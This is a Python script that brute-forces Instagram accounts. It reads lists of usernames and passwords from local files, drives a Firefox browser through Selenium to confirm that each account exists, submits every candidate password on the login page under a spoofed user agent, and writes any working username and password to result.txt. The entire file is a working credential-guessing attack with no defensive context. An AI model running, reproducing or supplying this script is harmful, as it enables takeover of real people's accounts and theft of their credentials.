import subprocess
import sys
import optparse
import mechanize
import http.cookiejar
from datetime import datetime
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

profile = webdriver.FirefoxProfile()
profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
driver = webdriver.Firefox()

br = mechanize.Browser()
ck = http.cookiejar.LWPCookieJar()
cookieArray = []
globalLogging = False
br.set_cookiejar(ck)
br.set_handle_robots(False)
br.set_handle_refresh(False)
br.set_handle_redirect(True)
br.set_handle_redirect(mechanize.HTTPRedirectHandler)
br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36')]

def userExists(username):
    driver.get("https://instagram.com/" + username)

    if 'Page Not Found' in driver.title:
        print('User doesnt: ' + username)
        return 0
    elif 'Página no encontrada' in driver.title:
        print('User doesnt: ' + username)
        return 0
    else:
        print('User exist: ' + username)
        print(datetime.now())
        return 1
		
def login(user, password, delay):
    try:
        print ('Trying with password: ' + password )
        doily = driver.find_element_by_name("username")
        doily.clear()
        doily.send_keys(user)
        doily = driver.find_element_by_name("password")
        doily.clear()
        doily.send_keys(password)  
        doily.send_keys(Keys.RETURN)
        sleep(delay)
        if ("Instagram" == driver.title):
            try:
                f = open('result.txt','a')
                f.write('username:'+user+'\npassword:'+password+'\n')
                f.close()
                driver.delete_all_cookies()
                return 1
            except:
                print('can not save')
                return 0
    except:
        print("Access denied.")

def broForce(usernames, passwords, delay, url):
    if (str(type(usernames)) == "<class 'list'>"):
        for username in usernames:
            if (userExists(username) == 0):
                continue
            driver.get('https://instagram.com/accounts/login/')
            sleep(delay)
            print('Trying with username: ' + username)
            for password in passwords:
                if (login(username,password,delay) == 1):
                    ck.clear()
                    break
    else:
        if (userExists(usernames) == 0):
            return
        driver.get('https://instagram.com/accounts/login/')
        sleep(delay)
        print('Trying with username: ' + usernames)
        for password in passwords:
            if (login(usernames, password, delay) == 1):
                break

def upgrade(package):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install','--upgrade', package])

def install(package):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

def init(url):
    try:
        f = open('passwords.txt', 'r')
        passwords = []
    
        while True:
            line = f.readline()
            if not line:
                break
            passwords.append(line.strip('\n'))
        f.close()
    except:
        print('Error')
        exit()

    try:
        f = open('usernames.txt', 'r')
        users = []
    
        while True:
            line = f.readline()
            if not line:
                break
            users.append(line.strip('\n'))
        f.close()
    except:
        print('Error')
        exit()

    broForce(users, passwords, 5, url)

def main():
    #upgrade('pip')
    #install('selenium')
    #install('mechanize')
    init('https://www.instagram.com/')
    
if __name__ == '__main__':
    main()